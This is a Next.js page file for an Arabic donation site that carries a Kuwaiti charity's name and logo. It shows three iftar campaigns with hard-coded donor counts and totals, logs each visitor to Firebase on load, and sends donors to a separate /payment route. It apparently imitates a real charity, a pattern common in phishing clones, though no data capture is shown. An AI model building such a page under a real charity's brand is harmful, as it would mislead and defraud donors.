"use client"
import Image from "next/image"
import { WhatsappIcon } from "@/components/icons"
import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { addData } from "@/lib/firebase"
export default function Home() {
  const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))

  const routre=useRouter()
  useEffect(()=>{
    addData({
      createdDate: new Date().toISOString(),
      id: _id,
    })
  },[])
  return (
    <div className="min-h-screen bg-gray-100 rtl">
      {/* Header */}
      <header className="bg-blue-600 text-white p-3 flex items-center justify-between">
        <button className="p-1">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="text-white"
          >
            <line x1="4" x2="20" y1="12" y2="12" />
            <line x1="4" x2="20" y1="6" y2="6" />
            <line x1="4" x2="20" y1="18" y2="18" />
          </svg>
        </button>
        <div className="flex items-center">
          <Image
            src="/white_logo2.png"
            alt="الخيرية الكويتية"
            width={120}
            height={32}
            className="h-8 w-auto"
          />
        </div>
      </header>

      <main className="container mx-auto p-4 space-y-6">
        {/* First Donation Card */}
        <section className="bg-white rounded-lg overflow-hidden shadow">
          <div className="p-4 bg-blue-600 text-white">
            <h2 className="text-lg font-bold text-right">إفطار صائم - غزة</h2>
          </div>

          <div className="relative">
            <img
              src="/5.jpg"
              alt="إفطار الصائم"
              width={400}
              height={300}
              className="w-full h-60 object-cover"
            />
            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">1.750 د.ك</div>
          </div>

          <div className="p-4">
            <div className="flex justify-between text-sm mb-2">
              <div className="text-gray-600">عدد المتبرعين: 1657</div>
            </div>

            <div className="flex justify-between mb-2">
              <div className="font-bold">62,500 د.ك</div>
              <div className="text-gray-600">المتبقي</div>
              <div className="font-bold">62,500 د.ك</div>
              <div className="text-gray-600">المدفوع</div>
              <div className="font-bold">125,000 د.ك</div>
              <div className="text-gray-600">المطلوب</div>
            </div>

            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
              <div className="bg-red-600 h-2 rounded-full" style={{ width: "50%" }}></div>
            </div>

            <div className="grid grid-cols-3 gap-2 mb-4">
              <button className="border border-gray-300 rounded py-2 text-center">5 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">10 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">20 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">50 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">100 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">200 د.ك</button>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <button onClick={()=>{
                routre.push('/payment')
              }}className="bg-red-600 text-white rounded py-2 text-center font-bold">تبرع الآن</button>
              <button className="bg-blue-600 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
            </div>
          </div>
        </section>

        {/* Second Donation Card (Completed) */}
        <section className="bg-white rounded-lg overflow-hidden shadow">
          <div className="p-4 bg-blue-600 text-white">
            <h2 className="text-lg font-bold text-right">إفطار صائم - إفريقيا
</h2>
          </div>

          <div className="relative">
            <img
              src="/4.jpg"
              alt="إفطار الصائم"
              width={400}
              height={200}
              className="w-full h-48 object-cover"
            />
            <div className="absolute inset-0 bg-opacity-70 flex items-center justify-center">
            </div>
          </div>

          <div className="p-4">
            <div className="flex justify-between text-sm mb-2">
              <div className="text-gray-600">عدد المتبرعين: 1150</div>
            </div>

            <div className="flex justify-between mb-2">
              <div className="font-bold">0 د.ك</div>
              <div className="text-gray-600">المتبقي</div>
              <div className="font-bold">75,000 د.ك</div>
              <div className="text-gray-600">المدفوع</div>
              <div className="font-bold">75,000 د.ك</div>
              <div className="text-gray-600">المطلوب</div>
            </div>

            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
              <div className="bg-green-600 h-2 rounded-full w-full"></div>
            </div>

            <div className="grid grid-cols-3 gap-2 mb-4">
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">5 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">10 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">20 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">50 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">100 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">200 د.ك</button>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <button onClick={()=>{
                routre.push('/payment')
              }} className="bg-gray-400 text-white rounded py-2 text-center font-bold">تبرع الآن</button>
              <button className="bg-gray-400 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
            </div>
          </div>
        </section>

        {/* Third Donation Card */}
        <section className="bg-white rounded-lg overflow-hidden shadow">
          <div className="p-4 bg-blue-600 text-white">
            <h2 className="text-lg font-bold text-right">إفطار صائم - سوريا
</h2>
          </div>

          <div className="relative">
            <img
              src="/3.jpg"
              alt="إفطار الصائم"
              width={400}
              height={200}
              className="w-full h-48 object-cover"
            />
            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">1.250 د.ك</div>
          </div>

          <div className="p-4">
            <div className="flex justify-between text-sm mb-2">
              <div className="text-gray-600">عدد المتبرعين: 221</div>
            </div>

            <div className="flex justify-between mb-2">
              <div className="font-bold">17,500 د.ك</div>
              <div className="text-gray-600">المتبقي</div>
              <div className="font-bold">2,500 د.ك</div>
              <div className="text-gray-600">المدفوع</div>
              <div className="font-bold">20,000 د.ك</div>
              <div className="text-gray-600">المطلوب</div>
            </div>

            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
              <div className="bg-red-600 h-2 rounded-full" style={{ width: "12%" }}></div>
            </div>

            <div className="grid grid-cols-3 gap-2 mb-4">
              <button className="border border-gray-300 rounded py-2 text-center">5 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">10 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">20 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">50 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">100 د.ك</button>
              <button className="border border-gray-300 rounded py-2 text-center">200 د.ك</button>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <button className="bg-red-600 text-white rounded py-2 text-center font-bold" onClick={()=>{
                routre.push('/payment')
              }}>تبرع الآن</button>
              <button className="bg-blue-600 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
            </div>
          </div>
        </section>
      </main>

      {/* WhatsApp floating button */}
      <div className="fixed bottom-4 right-4">
        <button className="bg-green-500 text-white p-3 rounded-full shadow-lg">
          <WhatsappIcon />
        </button>
      </div>
    </div>
  )
}

